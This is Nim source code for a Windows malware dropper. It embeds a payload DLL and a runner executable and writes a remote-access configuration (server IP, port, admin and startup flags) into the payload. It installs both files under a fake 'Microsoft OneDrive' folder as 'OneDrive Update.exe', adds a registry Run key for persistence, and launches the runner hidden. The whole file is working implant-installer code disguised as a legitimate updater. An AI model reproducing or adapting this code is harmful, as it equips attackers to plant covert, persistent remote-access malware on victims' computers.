import winim
import std/os

const
    MAX_PATH_LEN = 260
    ConfigMark = "FRMD26_CONFIG"
    DllName* = "payload.dll"

const 
    PayloadBin = staticRead("payload_build.dll")
    RunnerBin = staticRead("runner_build.exe")

const 
    PayloadBytes: array[PayloadBin.len, byte] = (
        var arr: array[PayloadBin.len, byte]
        for i in 0..<PayloadBin.len: arr[i] = byte(PayloadBin[i])
        arr
    )
    RunnerBytes: array[RunnerBin.len, byte] = (
        var arr: array[RunnerBin.len, byte]
        for i in 0..<RunnerBin.len: arr[i] = byte(RunnerBin[i])
        arr
    )

type
    CONNECT_ADDRESS* {.packed.} = object
        szFlag*: array[32, char]
        szServerIP*: array[100, char]
        szPort*: array[8, char]
        iType*: int32
        bEncrypt*: int32
        szBuildDate*: array[12, char]
        iMultiOpen*: int32
        iStartup*: int32
        iHeaderEnc*: int32
        protoType*: char
        runningType*: char
        payloadType*: char
        szGroupName*: array[24, char]
        runasAdmin*: char
        szInstallDir*: array[MAX_PATH_LEN, char]
        szInstallName*: array[MAX_PATH_LEN, char]
        szDownloadUrl*: array[512, char]
        taskStartup*: char
        serviceStartup*: char
        registryStartup*: char
        iPumpSize*: int32
        szReserved*: array[3, char]
        clientID*: uint64
        parentHwnd*: uint64
        superAdmin*: uint64
        pwdHash*: array[64, char]

proc toCharArray[N: static[int]](s: string): array[N, char] =
    for i in 0 ..< min(s.len, N):
        result[i] = s[i]

var g_ServerConfig* {.exportc, used.} = CONNECT_ADDRESS(
    szFlag: toCharArray[32](ConfigMark),
    szServerIP: toCharArray[100]("127.0.0.1"),
    szPort: toCharArray[8]("8080"),
    iType: 0,
    bEncrypt: 0,
    szBuildDate: toCharArray[12]("2026-02-10"),
    iMultiOpen: 1,
    iStartup: 1,
    iHeaderEnc: 1,
    protoType: 0.char,
    runningType: 0.char,
    payloadType: 0.char,
    szGroupName: toCharArray[24]("Default"),
    runasAdmin: 1.char,
    szInstallDir: toCharArray[MAX_PATH_LEN](r"%ProgramData%\Microsoft OneDrive"),
    szInstallName: toCharArray[MAX_PATH_LEN]("OneDrive Update.exe"),
    szDownloadUrl: toCharArray[512](""),
    taskStartup: 1.char,
    serviceStartup: 0.char,
    registryStartup: 1.char,
    iPumpSize: 0,
    clientID: 0,
    parentHwnd: 0,
    superAdmin: 0
)

proc main() =
    var szExpanded: array[MAX_PATH, char]
    let installDirCfg = $cast[cstring](addr g_ServerConfig.szInstallDir[0])
    ExpandEnvironmentStringsA(installDirCfg.cstring, addr szExpanded[0], MAX_PATH)
    let resolvedDir = $cast[cstring](addr szExpanded[0])

    try:
        createDir(resolvedDir)
    except:
        discard

    let exeNameCfg = $cast[cstring](addr g_ServerConfig.szInstallName[0])
    let exePath = resolvedDir & "\\" & exeNameCfg
    let dllPath = resolvedDir & "\\" & DllName

    try:
        writeFile(exePath, RunnerBytes)
        var payloadData = newString(PayloadBytes.len)
        if PayloadBytes.len > 0:
            copyMem(addr payloadData[0], unsafeAddr PayloadBytes[0], PayloadBytes.len)
            let marker = ConfigMark
            let markerLen = marker.len
            let maxPos = payloadData.len - sizeof(CONNECT_ADDRESS)
            for i in 0 ..< maxPos:
                if cmpMem(unsafeAddr payloadData[i], marker.cstring, markerLen) == 0:
                    let pAddr = cast[ptr CONNECT_ADDRESS](addr payloadData[i])
                    copyMem(pAddr, addr g_ServerConfig, sizeof(CONNECT_ADDRESS))
                    break
        writeFile(dllPath, payloadData)
    except:
        discard

    var hKey: HKEY
    if g_ServerConfig.registryStartup != 0.char and RegOpenKeyExA(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_SET_VALUE, addr hKey) == ERROR_SUCCESS:
        let valName = "OneDrive Update"
        let valData = "\"" & exePath & "\"" 
        RegSetValueExA(hKey, valName, 0, REG_SZ, cast[ptr BYTE](valData.cstring), DWORD(valData.len + 1))
        RegCloseKey(hKey)

    let cmd = "\"" & exePath & "\""
    WinExec(cmd.cstring, SW_HIDE)

when isMainModule:
    main()
